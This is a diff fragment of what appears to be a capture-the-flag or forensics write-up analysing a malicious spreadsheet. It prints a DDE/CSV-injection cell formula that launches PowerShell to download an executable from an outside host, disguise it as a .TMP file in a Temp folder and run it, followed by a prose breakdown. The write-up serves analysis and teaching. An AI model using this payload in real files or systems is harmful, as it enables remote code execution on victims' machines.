@@ -71,7 +71,7 @@ $ xmllint --format content.xml | grep DDE
  
 Output:
 ```
- <table:table-cell table:formula="of:=DDE(&quot;powershell&quot;;&quot;Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'; Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'&quot;;&quot;!A0&quot;)"
+<table:table-cell table:formula="of:=DDE(&quot;powershell&quot;;&quot;Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'; Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'&quot;;&quot;!A0&quot;)"
 ```
 
 Here is a breakdown, the cell contain a DDE payload with a CSV injection format. It executes powershell and runs command of `Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe';` and `Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'`. So, it downloads and exe files which attempts to hide as a TMP file and stores at Temp folder and later on execute the exe file.
